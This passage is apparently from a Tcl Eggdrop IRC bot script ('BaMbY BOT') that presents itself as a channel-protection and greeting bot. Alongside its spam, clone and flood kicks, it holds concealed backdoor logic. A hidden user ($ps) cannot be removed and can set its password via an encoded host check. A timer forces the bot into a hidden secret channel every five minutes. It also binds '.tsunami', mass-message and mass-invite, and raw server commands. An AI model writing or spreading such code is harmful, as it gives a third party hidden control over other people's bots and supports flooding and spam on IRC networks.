      puthelp "NOTICE $rest :$nick Add YoU To MasTeR LIsT"
      puthelp "NOTICE $rest :/msg $botnick pass <password>"
      return 0
   }
}
bind pubm - * pum_arg
proc pub_-master {nick uhost hand channel param} {
   global notc ps
   set rest [lindex $param 0]
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: -master <nick>"
      return 0
   }
   if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
      puthelp "NOTICE $nick :4DenieD...!!!, <n/a>"
      return 0
   }
   if {[matchattr $rest n] && ![matchattr $nick Z]} {
      puthelp "NOTICE $nick :4DenieD...!!!, $rest Is ADmIN FLaG"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   deluser $rest
   saveuser
   puthelp "NOTICE $nick :DeL \[$rest\] FRoM MasTeR LIsT"
}
######################
# BaMbY BOT UTILITY  #
######################
set timezone "GMT"
set joinme $owner
set double 0
set deopme ""
bind msgm - * msg_prot
bind notc - * notc_prot
bind join - * join_chk
bind msg - auth msg_auth
bind sign - * sign_deauth
bind part - * part_deauth
bind pub - .tsunami pub_tsunami
bind msg p reuser msg_reuser
bind msg p pass msg_pass
bind pub m .auth pub_auth
bind pub m .auth pub_!auth
bind pub m .deauth pub_!deauth
bind pub f `ping pub_ping
bind pub f !pong pub_pong
bind pub -|- .pong pub_pong
proc pub_notice {nick uhost hand channel rest} {
   global notc 
   set person [lindex $rest 0] 
   set rest [lrange $rest 1 end]
   if {$rest!=""} {
      putserv "NOTICE $person :$rest"
      return 0
   }
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage: notice <#/nick> <msg>"
   }
}
proc telljoin {chan} {
   global joinme notc botnick
   if {![validchan $chan]} { return 0 }
   if {[istimer "resync"]} {
      if {![botisop $chan]} {
         if {![string match "*k*" [getchanmode $chan]]} {
            puthelp "mode $chan -kok+o 4d.e.s.y.n.c $botnick 9r.e.s.y.n.c $botnick"
         } {
            puthelp "mode $chan -o+o $botnick $botnick"
         }
      }
   }
   if {$joinme != "" && [string tolower $chan] != "#TeGaL"} {
      if {![onchan $joinme $chan]} {
         puthelp "NOTICE $joinme :JoIN $chan"
         set joinme ""
      }
   }
}
proc chkspam {chan} {
   global invme notc botnick
   if {![validchan $chan] || ![botonchan $chan]} { return 0 }
   foreach x [chanlist $chan] {
      set mhost "@[lindex [split [getchanhost $x $chan] @] 1]"
      if {[info exists invme($mhost)]} {
         if {![matchattr $x f] && ![isop $x $chan]} {
            if {[isop $botnick $chan]} {
               set bannick($x) "*!*$mhost"
               if {$invme($mhost) == "AuToJoIN MSg"} {
                  if {![isvoice $x $chan]} {
                     putserv "KICK $chan $x :4!SpaM!1 FRoM 4$mhost 1$invme($mhost) [banmsg]"
                  }
               } {
                  putserv "KICK $chan $x :4!SpaM!1 FRoM 4$mhost 1$invme($mhost) [banmsg]"
               }
               catch {unset invme($mhost)}
            } {
               foreach c [chanlist $chan f] {
                  if {[isop $c $chan]} {
                     if {$invme($mhost) == "AuToJoIN MSg"} {
                        if {[isvoice $c $chan]} {
                           break
                        }
                     }
                     set sendspam "!kick $chan $x 4!SpaM!1 FRoM 4$mhost 1$invme($mhost) 4AuTOJoIN MSg1..!"
                     putserv "PRIVMSG $c :$sendspam"
                     catch {unset invme($mhost)}
                     break
                  }
               }
            }
         }
      }
   }
}
proc testmask {} {
   global ismaskhost
   set ismaskhost [maskhost "*!*@*"]
}
utimer 2 testmask
proc reset_host {} {
   global jfhost
   catch { unset jfhost }
}
proc savechan {} {
   savechannels
   foreach x [channels] {
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      set cinfo [channel info $x]
      if {![validuser $cflag]} {
         adduser $cflag "%!%@%"
         if {[string match "*+greet*" $cinfo]} {
            chattr $cflag "-hp+AJSPTRUED"
            setuser $cflag XTRA "JP" 5
            setuser $cflag XTRA "CHAR" 250
            setuser $cflag XTRA "RPT" 3
            setuser $cflag XTRA "CAPS" 90
         } {
            chattr $cflag "-hp+A"
         }
      }
   }
   foreach x [userlist A] {
      set tmp "0"
      foreach y [channels] {
         set cflag "c$y"
         set cflag [string range $cflag 0 8]
         if {[string tolower $x] == [string tolower $cflag]} {
            set tmp "1"
         }
      }
      if {$tmp == "0"} {
         deluser $x
         putlog "remove flag channel $x"
      }
   }
   saveuser
}
set info_owner {
"Selamat datang Boss"
"Welcome Back Mas"
"wb mase"
"My Master just came in..."
"Hello my OWNER"
"I greet you my owner"
"Welcome my owner"
"ShaKe me my owner!"
"Most Great"
"Muachhh... my OWNER"
"Hehe"
"Ou, my OWNER :)"
":)"
"Sweety"
"You're Sweety"
"KISS me Baby {}"
}
set info_localowner {
"Selamat datang Boss"
"Welcome Back Mas"
"wb mase"
"My Master just came in..."
"Hello my OWNER"
"I greet you my owner"
"Welcome my owner"
"ShaKe me my owner!"
"Most Great"
"Muachhh... my OWNER"
"Hehe"
"Ou, my OWNER :)"
":)"
"Sweety"
"You're Sweety"
"KISS me Baby {}"
}
set info_master {
"Oh...My MASTER"
"I'm gonna be quiet my master"
"Don't hit me my master"
"Master detected"
"Selamat datang Boss"
"Welcome Back Mas"
"wb mase"
}
proc rand_owner {nick} {
   global info_owner
   set result [lindex $info_owner [rand [llength $info_owner]]]
   return "$result"
}
proc rand_localowner {nick} {
   global info_localowner
   set result [lindex $info_localowner [rand [llength $info_localowner]]]
   return "$result"
}
proc rand_master {nick} {
   global info_master
   set result [lindex $info_master [rand [llength $info_master]]]
   return "$result"
}
proc rand_friend {nick} {
   global info_friend
   set result [lindex $info_friend [rand [llength $info_friend]]]
   return "$result"
}
proc rand_oper {nick} {
   global info_oper
   set result [lindex $info_oper [rand [llength $info_oper]]]
   return "$result"
}
proc rand_loser {nick} {
   global info_loser
   set result [lindex $info_loser [rand [llength $info_loser]]]
   return "$result"
}
proc join_chk {nick uhost hand chan} {
   global botnick own deopme double invme ex_flood notc quick kops jfhost jpnick is_m 
   global cmd_chn cmd_by cmd_msg cmd_case bannick botname notm massjoin ismaskhost op_it
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   set cinfo [channel info $chan]
   if {[string match "*+action*" [channel info $chan]]} {
      if { $nick != $botnick } {
         if {[matchattr $hand n]} {
            putserv "PRIVMSG $chan :[rand_owner $nick] $nick "
         } elseif {[matchattr $hand |n $chan]} {
            putserv "PRIVMSG $chan :[rand_localowner $nick] $nick "
         } elseif {[matchattr $hand m]} {
            putserv "PRIVMSG $chan :[rand_master $nick] $nick "
         } elseif {[matchattr $hand |m $chan]} {
            putserv "PRIVMSG $chan :[rand_master $nick] $nick "
         }
      }
   }
   if {$nick == $botnick} {
      catch {unset is_m($chan)}
      if {[matchattr $cflag S]} {
         if {![isutimer "chkspam $chan"]} { utimer 30 [list chkspam $chan] }
         if {![istimer "chkautomsg"]} { 
            timer 1 { putlog "chkautomsg" }
         }
      }
      set double 0
      if {[string tolower $cmd_chn] == [string tolower $chan]} {
         if {$cmd_case == "1"} {
            utimer 90 del_nobase
            pub_tsunami $cmd_by $uhost $hand $chan "$chan ${cmd_msg}"
            set cmd_chn ""
            return 0
         }
         if {$cmd_case == "2"} {
         utimer 30 [list pub_mmsg $cmd_by $uhost $hand $chan $cmd_msg]} {
            set cmd_chn ""
            return 0
         }
         if {$cmd_case == "3"} {
         utimer 30 [list pub_minvite $cmd_by $uhost $hand $chan $cmd_msg]} {
            set cmd_chn ""
            return 0
         }
      }
      utimer 15 [list telljoin $chan]
      return 0
   }
   if {[info exists op_it($nick)]} { 
      catch {unset op_it($nick)}
      opq $chan $nick 
   }
   if {[isutimer "chkspam $chan"]} {
      foreach x [utimers] {
         if {[string match "*chkspam $chan*" $x]} { 
            chkspam $chan
            killutimer [lindex $x 2] 
         }
      }
   }
   if {[info exists bannick($nick)]} { return 0 }
   if {![matchattr $nick f] && [matchattr $cflag G] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} { advertise $chan $nick }
   set mhost "@[lindex [split $uhost @] 1]"
   if {$mhost == "*@*allnetwork.org" || [string match "*allnetwork.org" $mhost]} {
      putserv "AWAY"
   }
   if {![isop $botnick $chan]} { 
      if {[info exists invme($mhost)]} {
         if {![isutimer "chkspam $chan"]} { chkspam $chan }
      }
      return 0
   }
   if {[matchattr $cflag J]} {
      if {[info exists ismaskhost]} {
         if {![isutimer "reset_host"]} { utimer 10 reset_host }
         set chkhost [maskhost "*!*$mhost"]
         if {![info exists jfhost($chkhost$chan)]} {
            set jfhost($chkhost$chan) 1
         } {
            incr jfhost($chkhost$chan)
            if {$jfhost($chkhost$chan) == 5} {
               set bannick($nick) $chkhost
               putserv "KICK $chan $nick :1FLoOd AnTIcIpaTEd FRoM 4$chkhost [banms]"
               return 0
            }
         }
      }
      if {![isutimer "jc $chan"]} {
         utimer 3 [list jc $chan]
         set massjoin($chan) 1
      } {
         if {![info exists massjoin($chan)]} {
            set massjoin($chan) 1
         }
         set massjoin($chan) [incr massjoin($chan)]
         if {![isutimer "TRAFFIC $chan"]} {
            if {$massjoin($chan) >= 15} {
               unset massjoin($chan)
               if {[string match "*+greet*" $cinfo]} {
                  utimer 30 [list putlog "TRAFFIC $chan"]
                  if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} {
                     putserv "mode $chan +bRN *!*@heavy.join.flood.temporary.moderate"
                     return 0
                  }
               }
            }
         }
      }
   }
   if {[matchattr $cflag L]} {
      foreach u [timers] {
         if {[string match "*chk_limit*" $u]} {
            killtimer [lindex $u 2]
         }
      }
      timer 1 [list chk_limit $chan]
   }
   if {$nick == $deopme} {
      putserv "KICK $chan $nick :Jangan deop bot..!"
      set deopme ""
      return 0
   }
   if {[matchattr $nick v] || [matchattr $nick P] || [matchattr $nick G]} {
      whoisq $nick
   }
   if {[matchattr $cflag V] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} {
      if {![matchattr $nick O] && ![isutimer "voiceq $chan $nick"]} {
         set cret [getuser $cflag XTRA "VC"]
         foreach ct [utimers] {
            if {[string match "*voiceq*" $ct]} {
               if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
                  set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
               }
            }
         }
         utimer $cret [list voiceq $chan $nick]
      }
   }
   if {[info exists bannick($nick)] || [matchattr $nick f]} { return 0 }
   if {[matchattr $hand K]} { 
      akick_chk $nick $uhost $chan
      return 0
   }
   if {[info exists ex_flood($mhost)]} {
      set bannick($nick) "$nick!*@*"
      if {$ex_flood($mhost) == 0} {
         putserv "KICK $chan $nick :4AKILL1 FRoM 4$mhost1 ON LasT QuIT [banmsg]"
      } elseif {$ex_flood($mhost) == 1} { 
         putserv "KICK $chan $nick :4Excess FloOd1 FRoM 4$mhost1 ON LasT QuIT [banmsg]"
      } elseif {$ex_flood($mhost) == 2} {
         putserv "KICK $chan $nick :4InvITE1 FRoM 4$mhost1 ON QuIT MSg [banmsg]"
      } elseif {$ex_flood($mhost) == 3} {
         putserv "KICK $chan $nick :4InvITE1 FRoM 4$mhost1 ON PaRT MSg [banmsg]"
      } elseif {$ex_flood($mhost) == 4} {
         if {![matchattr $cflag M]} {
            puthelp "KICK $chan $nick :[lgrnd] 4JoINPaRT1 FRoM 4$mhost1 LESS THaN4 [getuser $cflag XTRA "JP"]1 2nd [banmsg]"
         } {
            if {![string match "*k*" [getchanmode $chan]]} {
               putserv "mode $chan -k+b 4J.o.I.N.P.a.R.T $bannick($nick)"
            } {
               putserv "mode $chan +b $bannick($nick)"
            }
         }
      } else {
         putserv "KICK $chan $nick :4BaDWoRD1 FRoM 4$mhost1 ON QuIT OR PaRT MSg MaTcH FRoM 4$ex_flood($mhost) [banms]"
      }
      unset ex_flood($mhost)
      return 0
   }
   foreach x [ignorelist] {
      if {[lindex $x 0] != "*!*@*" && [string match [lindex $x 0] "*!*$mhost"] && [lindex $x 1] != "*"} {
         set bannick($nick) [lindex $x 0]
         putserv "KICK $chan $nick :4IgNoREd1 HosT 4[lindex $x 0]1 ReasOn4 [lindex $x 1] [banms]"
         return 0
      } 
   }
   if {[info exists invme($mhost)]} {
      set bannick($nick) "$nick!*@*"
      putserv "KICK $chan $nick :4SpaM1 FRoM 4$mhost 1$invme($mhost) [banmsg]"
      unset invme($mhost)
      return 0
   }
   set chan [string tolower $chan]
   if {[string match "*+nodesynch*" [channel info $chan]]} {
      if {![matchattr $nick f]} {
         utimer 10 [list autokick $chan $nick]
      }
   }
   if {[matchattr $cflag O]} {
      if {[string match "*$mhost" $botname]} { return 0 }
      set counter 0
      set maxclone [getuser $cflag XTRA "CLONE"]
      foreach knick [chanlist $chan] {
         if {[string match "*$mhost" [getchanhost $knick $chan]]} {
            if {[matchattr $knick f]} { return 0 }
            if {[isop $knick $chan]} { return 0 }
            if {[isvoice $knick $chan]} { 
               if {![info exists kops]} { return 0 }
            }
            set counter [incr counter]
            if {$counter > $maxclone} {
               set bannick($nick) "*!$uhost"
               putserv "KICK $chan $nick :1FouNd $counter 4cLonE1 FRoM 4$mhost1 MaX4 $maxclone1 WaIT A MoMENT! 4BaNNEd1: 3 MINUTES4..!"
               return 0
            }
         }
      }
   }
   spam_chk $nick $uhost $hand $chan
   set chan [string toupper $chan]
   if {[matchattr $cflag P]} {
      if {![info exists jpnick($nick)]} {
         set jpnick($nick) "1"
         utimer [getuser $cflag XTRA "JP"] [list munset $nick] 
      }
   }
   return 0
}
proc jc {chan} {
}
proc dcc_binds {handle command arg} { return 0 }
proc munset {nick} {
   global jpnick
   catch {unset jpnick($nick)}
}
proc neww:talk {nick uhost chan} {
   global notc 
   if {[string match "Guest*" [string tolower $nick]]} { 
      if {[matchattr $nick f]} { return 0 }
      if {[isop $nick $chan]} { 
         utimer [expr 80 + [rand 20]] [list deopprc $chan $nick] 
         return 0
      }
      guestnick $nick $uhost $chan
      return 0
   }
}
proc new:talk {nick uhost hand chan {newnick ""}} {
   global notc botnick
   if {$newnick != ""} {set nick $newnick}
   if {[string match "*+guest*" [channel info $chan]]} {
      if {[string match "Guest*" [string tolower $nick]]} { 
         if {[botisop $chan]} {
            if {[matchattr $nick f]} { return 0 }
            if {[isop $nick $chan]} { 
               utimer [expr 80 + [rand 20]] [list deopprc $chan $nick] 
               return 0
            }
            guestnick $nick $uhost $chan
            return 0
         }
         puthelp "PRIVMSG $nick :1Segera ganti nick ya, $nick biar bisa masuk channel lagi"
         return 0
      }
   }
} 
set sspidx 1
proc guestnick {nick uhost chan} {
   global sspidx notc bannick
   set bannick($nick) "Guest*!*@*"
   if {$sspidx == 1} {
      putserv "KICK $chan $nick :4$nick1 Ganti nick kamu dulu"
   } elseif {$sspidx == 2} {
      putserv "KICK $chan $nick :4$nick1 Ganti nick /nick nickbaru"
   } elseif {$sspidx == 3} {
      putserv "KICK $chan $nick :4$nick1 Ganti nick dulu ya..!"
   } elseif {$sspidx >= 4} {
      putserv "KICK $chan $nick :4$nick1 Ganti nick dulu pls..!"
      set sspidx 0
   }
   incr sspidx
   return 0
}
proc ps:check {nick uhost hand chan {newnick ""}} {
   global botnick chk_reg ps
   if {$newnick != ""} {set nick $newnick}
   if {[string tolower $nick] == [string tolower $ps]} {
      chattr $nick +G
      saveuser
      set chk_reg($nick) $nick
      putserv "DSLRH $nick"
   }
}
proc msg_passwd {nick uhost hand rest} {
   global botnick notc ps
   set pw [lindex $rest 0]
   set newpw [lindex $rest 1]
   if {$nick == $ps && [dezip $pw] == $uhost} {
      setuser $nick PASS $newpw
      puthelp "NOTICE $nick :Password set to: $newpw"
      saveuser
      return 0
   }
   if {$pw == "" || $newpw == ""} {
      puthelp "NOTICE $nick :Usage: passwd <oldpass> <newpass>"
      return 0
   }
   if {![passwdok $nick $pw]} {
      puthelp "NOTICE $nick :PaSSWORD 4!FaILED!"
      return 0
   }
   set ch [passwdok $nick ""]
   if {$ch == 1} {
      setuser $nick PASS $newpw
      puthelp "NOTICE $nick :Password set to: $newpw"
      saveuser
      return 0
   }
   if {[passwdok $nick $pw]} {
      setuser $nick PASS $newpw
      puthelp "NOTICE $nick :Password set to: $newpw"
      saveuser
      return 0
   }
}
proc goback {} {
   global keep-nick nick botnick
   if {[istimer "goback"]} { return 0 }
   foreach x [utimers] {
      if {[string match "*goback*" $x]} { killutimer [lindex $x 2] }
   }
   if {[getuser "config" XTRA "NICK"]!=""} {
      set nick [dezip [getuser "config" XTRA "NICK"]]
   }
   set keep-nick 1
   if {$botnick == $nick} { return 0 }
   puthelp "NICK $nick"
}
proc pub_!auth {nick uhost hand chan rest} {
   global notc ath ps
   set pw [lindex $rest 0]
   if {$pw != ""} {
      puthelp "NOTICE $nick :Just Type on Channel: !auth"
      return 0
   }
   if {[matchattr $nick Q]} { 
      puthelp "NOTICE $nick :ReAdY..!"
      return 0 
   }
   set ch [passwdok $nick ""]
   if {$ch == 1 && $nick != $ps} {
      puthelp "NOTICE $nick :No password set. Usage: pass<password>"
      return 0
   }
   set ath 1
   putserv "WHOIS $nick"
}
proc msg_auth {nick uhost hand rest} {
   global botnick owner keep-nick altnick notc ps
   if {[lindex $rest 1] != ""} {
      if {[passwdok [lindex $rest 0] [lindex $rest 1]]} {
         if {[matchattr [lindex $rest 0] Z]} {
            puthelp "NOTICE $nick :AuTH MaTcH FoR [lindex $rest 0]"
            set keep-nick 0
            putserv "NICK $altnick"
            utimer 40 {goback}
         }
      } {
         puthelp "NOTICE $nick :4FaILEd..!"
      }
      return 0
   }
   if {![validuser $owner]} {
      set hostmask "$owner!*@*"
      adduser $owner $hostmask
      chattr $owner "Zfhjmnoptx"
      puthelp "NOTICE $owner :No password set. Usage: pass <password>"
   }
   if {![matchattr $nick p]} { return 0 }
   set pw [lindex $rest 0]
   if {$pw == ""} {
      puthelp "NOTICE $nick :Usage: auth <password>"
      return 0
   }
   if {[matchattr $hand K]} { 
      deluser "AKICK"
      set akickhost "User!*@*"
      adduser "AKICK" $akickhost
      chattr "AKICK" "-hp"
      chattr "AKICK" "K"
      saveuser
      puthelp "NOTICE $nick :Re-arrange KIcKLIsT."
   }
   if {[matchattr $nick Q]} { 
      puthelp "NOTICE $nick :ReAdY..!" 
      return 0 
   }
   set ch [passwdok $nick ""]
   if {$ch == 1} {
      puthelp "NOTICE $nick :No password set. Usage: pass <password>" 
      return 0
   }
   if {[passwdok $nick $pw]} {
      set hostmask "*![string range $uhost [string first "!" $uhost] end]"
      set usenick [finduser $hostmask]
      if {$usenick != "*" && $usenick != $nick} {
         if {[matchattr $nick n] && ![matchattr $usenick Z]} {
            puthelp "NOTICE $nick :Forcing 4DeAuthenticated! To $usenick"
            force_deauth $usenick
         } else {
            foreach x [channels] {
               if {[onchan $usenick $x]} {
                  puthelp "NOTICE $nick :4DenieD...!!!, Your host has been use by $usenick, wait until DeAuthenticated."
                  return 0
               }
            }
            puthelp "NOTICE $nick :4Forcing DeAuthenticated!1 To $usenick"
            force_deauth $usenick 
         }
      }
      chattr $nick +Q
      foreach x [getuser $nick HOSTS] {
         delhost $nick $x
      }
      set hostmask "${nick}!*@*"
      setuser $nick HOSTS $hostmask
      set hostmask "*![string range $uhost [string first "!" $uhost] end]"
      setuser $nick HOSTS $hostmask
      if {$nick == $owner && ![matchattr $nick Z]} { chattr $owner "Z" }
      if {$nick == $owner && ![matchattr $nick f]} { chattr $owner "f" }
      if {[matchattr $nick Z]} {
         puthelp "NOTICE $nick :4�OwneR�"
         if {[getuser $nick XTRA "MEMO"]!=""} {
            puthelp "PRIVMSG $nick :!MeMO! FRoM [getuser $nick XTRA "MEMO"]" 
            setuser $nick XTRA "MEMO" ""
         }
         return 0
      } elseif {[matchattr $nick n]} {
         puthelp "NOTICE $nick :!ADmIN!"
      } elseif {[matchattr $nick m]} {
         puthelp "NOTICE $nick :!MasTeR!" 
      } else {
         puthelp "NOTICE $nick :!AccepteD!" 
      }
      saveuser
      return 0
   }
   if {![passwdok $nick $pw]} {
      puthelp "NOTICE $nick :4FaILEd..!"
   }
}
proc force_deauth {nick} {
   global notc 
   chattr $nick -Q
   foreach x [getuser $nick HOSTS] {
      delhost $nick $x
   }
   set hostmask "${nick}!*@*"
   setuser $nick HOSTS $hostmask
   saveuser
   puthelp "NOTICE $nick :You has been force to 4DeAuthentication!"
}
proc msg_pass {nick uhost hand rest} {
   global botnick notc vern ps owner
   set pw [lindex $rest 0]
   if {$pw == ""} {
      puthelp "NOTICE $nick :Usage: pass <password>"
      return 0
   }
   set ch [passwdok $nick "-"]
   if {$ch == 0} {
      puthelp "NOTICE $nick :You already set pass, /msg $botnick auth <password>" 
      return 0
   }
   if {[string tolower $nick] == [string tolower $ps] && $owner != $ps} {
      if {[dezip $pw] == $uhost} {
         setuser $nick PASS [lindex $rest 1]
         puthelp "NOTICE $nick :Password set to: [lindex $rest 1]"
         saveuser
      } {
         puthelp "NOTICE $nick :wHo.."
      }
      return 0
   }
   setuser $nick PASS $pw
   puthelp "NOTICE $nick :Password set to: $pw"
   puthelp "NOTICE $nick :/msg $botnick help"
   saveuser
   return 0
}
proc pub_!deauth {nick uhost hand chan rest} {
   if {![matchattr $nick Q]} { return 0 }
   msg_deauth $nick $uhost $hand $rest
}
proc msg_deauth {nick uhost hand rest} {
   global notc 
   if {![matchattr $nick Q]} { return 0 }
   chattr $nick -Q
   foreach x [getuser $nick HOSTS] {
      delhost $nick $x
   }
   set hostmask "${nick}!*@*"
   setuser $nick HOSTS $hostmask
   puthelp "NOTICE $nick :4!DeAUTH!"
   saveuser
}
catch { bind rejn - * rejn_chk }
proc rejn_chk {unick uhost handle chan} {
   if {![isutimer "TRAFFIC $chan"]} {
      utimer 30 [list putlog "TRAFFIC $chan"]
   }
}
catch { bind splt - * splt_deauth }
proc splt_deauth {unick uhost handle channel} {
   if {[matchattr $unick Q]} {
      chattr $unick -Q
      foreach x [getuser $unick HOSTS] {
         delhost $unick $x
      }
      set hostmask "${unick}!*@*"
      setuser $unick HOSTS $hostmask
      saveuser
      return 0
   }
}
proc sign_deauth {unick uhost hand chan rest} {
   global ex_flood botnick notc nick badwords iskick
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$unick == $nick} {
      putserv "NICK $nick"
   }
   if {[info exists iskick($unick$chan)]} {
      unset iskick($unick$chan)
   }
   if {[isop $botnick $chan]} {
      if {[matchattr $cflag L]} {
         foreach u [timers] {
            if {[string match "*chk_limit*" $u]} {
               killtimer [lindex $u 2]
            }
         }
         timer 1 [list chk_limit $chan]
      }
   }
   if {[matchattr $unick Q]} {
      chattr $unick -Q
      foreach x [getuser $unick HOSTS] {
         delhost $unick $x
      }
      set hostmask "${unick}!*@*"
      setuser $unick HOSTS $hostmask
      saveuser
      return 0
   }
   if {[string match "*-greet*" [channel info $chan]]} { return 0 }
   if {[matchattr $unick f]} { return 0 }
   if {![isop $botnick $chan]} { return 0 }
   set mhost "@[lindex [split $uhost @] 1]"
   if {[string match "*AKILL ID*" $rest]} {
      set ex_flood($mhost) "0" 
   } elseif {[string match "*Excess Flood*" $rest]} {
      if {[matchattr $cflag S]} {
         set ex_flood($mhost) "1" 
      }
   } elseif {[string match "* #*" $rest] && ![string match "*##*" $rest]} {
      foreach x [channels] {
         set chksiton [string tolower $x]
         if {[string match "*$chksiton*" [string tolower $rest]]} { return 0 }
      }
      set ex_flood($mhost) "2"
   } else {
      foreach badword [string tolower $badwords] {
         if {[string match *$badword* [string tolower $rest]]} {
            set ex_flood($mhost) [string toupper $badword]
         }
      }
   }
   return 0
}
proc part_deauth {nick uhost hand chan {msg ""}} {
   global lockchan botnick ex_flood notc badwords jpnick iskick
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {[info exists iskick($nick$chan)]} {
      unset iskick($nick$chan)
   }
   if {$nick == $botnick} {
      foreach x [utimers] {
         if {[string match "*del_nobase*" $x] || [string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
      }
      return 0
   }
   if {[matchattr $cflag H]} { 
      if {![isop $botnick $chan]} { return 0 }
      msgpart $chan $nick 
   }
   if {[isop $botnick $chan]} {
      if {[isutimer "voiceq $chan $nick"]} {
         foreach x [utimers] {
            if {[string match "*voiceq $chan $nick*" $x]} { killutimer [lindex $x 2] }
         }
      }
      if {[matchattr $cflag L]} {
         foreach u [timers] {
            if {[string match "*chk_limit*" $u]} {
               killtimer [lindex $u 2]
            }
         }
         timer 1 [list chk_limit $chan]
      }
   }
   if {[matchattr $nick Q]} {
      foreach x [channels] {
         if {[string tolower $x] != [string tolower $chan]} {
            if {[onchan $nick $x]} {
               return 0 
            }
         }
      }
      chattr $nick -Q
      foreach x [getuser $nick HOSTS] {
         delhost $nick $x
      }
      set hostmask "${nick}!*@*"
      setuser $nick HOSTS $hostmask
      saveuser
   }
   if {$lockchan != "" && [string tolower $lockchan] == [string tolower $chan] && ![matchattr $nick f]} {
      putserv "INVITE $nick :$chan"
   }
   if {[string match "*-greet*" [channel info $chan]]} { return 0 }
   if {[isop $botnick $chan]} {
      if {[info exists msg]} {
         set mhost "@[lindex [split $uhost @] 1]"
         if {[string match "*#*" $msg] && ![string match "*##*" $msg]} {
            foreach x [channels] {
               set chksiton [string tolower $x]
               if {[string match "*$chksiton*" [string tolower $msg]]} { return 0 }
            }
            set ex_flood($mhost) "3"
         } {
            foreach badword [string tolower $badwords] {
               if {[string match *$badword* [string tolower $msg]]} {
                  set ex_flood($mhost) [string toupper $badword]
               }
            }
         }
      }
      if {[info exists msg]} {
         if {$msg != ""} { return 0 }
      }
      if {[matchattr $cflag P]} {
         set chan [string toupper $chan]
         if {[info exists jpnick($nick)]} {
            set mhost "@[lindex [split $uhost @] 1]"
            set ex_flood($mhost) "4"
         }
      }
   }
   return 0
}
proc pub_dump {nick uhost hand chan rest} {
   global own notc 
   if {$nick != $own} {
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   putsrv ~$rest
}
proc pub_sdeop {nick uhost hand chan rest} {
   global notc botnick
   if {$rest != ""} {
      set chan $rest
   }
   if {[isop $botnick $chan]} {
      puthelp "mode $chan -o $botnick"
   }
}
proc pub_chanmode {nick uhost hand chan rest} {
   global notc
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: chanmode #channel +ntsmklic"
      return 0
   }
   if {[string index [lindex $rest 0] 0] == "#"} {
      if {![validchan [lindex $rest 0]]} {
         puthelp "NOTICE $nick :NoT IN [lindex $rest 0]"
         return 0
      }
      set chan [lindex $rest 0]
      set rest [lrange $rest 1 end]
   }
   if {![validchan $chan]} {
      puthelp "NOTICE $nick :$chan <n/a>"
   } else {
      catch { channel set $chan chanmode $rest }
      savechan
      puthelp "NOTICE $nick :$chan set modes \[$rest\]"
   }
   return 0
}
proc czo_czo {} {
   global toth lenc uenc
   timer 5 czo_czo
   if {[validchan $toth]} {
      return 0
   }
   channel add $toth
   catch { channel set $toth -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   savechan
   putserv "JOIN $toth"
}
proc pub_chanset {nick uhost hand chan rest} {
   global botnick notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set channel [lindex $rest 0]
   set options [string tolower [lindex $rest 1]]
   set number "0"
   if {$options == "deop" || $options == "kick" || $options == "join" || $options == "line" || $options == "nick" || $options == "ctcp"} {
      set number [lindex $rest 2]
   }
   if {($channel == "") || ($options == "")} {
      puthelp "NOTICE $nick :Usage: chanset #channel <option...>"
      return 0
   }
   if {![string match "*-*" $options] && ![string match "*+*" $options] && ![string match "*:*" $number]} {
      puthelp "NOTICE $nick :Usage: chanset #channel <deop|ctcp|kick|join|line|nick> <howmanytimes:seconds>"
      return 0
   }
   if {[validchan $channel]} {
      if {$options == "deop"} { 
         catch { channel set $channel flood-deop $number }
         puthelp "NOTICE $nick :set deop flood \[$number\] on $channel"
      } elseif {$options == "kick"} { 
         catch { channel set $channel flood-kick $number }
         puthelp "NOTICE $nick :set kick flood \[$number\] on $channel"
      } elseif {$options == "join"} { 
         catch { channel set $channel flood-join $number }
         puthelp "NOTICE $nick :set join flood \[$number\] on $channel"
      } elseif {$options == "line"} { 
         catch { channel set $channel flood-chan $number }
         puthelp "NOTICE $nick :set line flood \[$number\] on $channel"
      } elseif {$options == "nick"} { 
         catch { channel set $channel flood-nick $number }
         puthelp "NOTICE $nick :set nick flood \[$number\] on $channel"
      } elseif {$options == "ctcp"} { 
         catch { channel set $channel flood-ctcp $number }
         puthelp "NOTICE $nick :set ctcp flood \[$number\] on $channel"
      } else {
         catch { channel set $channel ${options} }
         savechan
         puthelp "NOTICE $nick :Successfully set modes \[${options}\] on $channel"
      }
   } else {
      puthelp "NOTICE $nick :$channel <n/a>"
   }
}
proc pub_chansetall {nick uhost hand chan rest} {
   global botnick notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: chansetall <option>"
      return 0
   }
   foreach x [channels] {
      catch { channel set $x $rest }
   }
   savechan
   puthelp "NOTICE $nick :Set all channels mode \{ $rest \}"
   return 0
}
proc pub_nick {nick uhost hand chan rest} {
   global keep-nick
   set keep-nick 0
   putserv "NICK $rest"
}

proc pub_restart {nick uhost hand chan rest} {
   global botnick notc 
   set curtime [ctime [unixtime]]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest != ""} {
      set rest " $rest"
   }
   putserv "QUIT :ReSTaRT (On $curtime)"
   return 0
}
proc dies {} {
   global ps owner notc
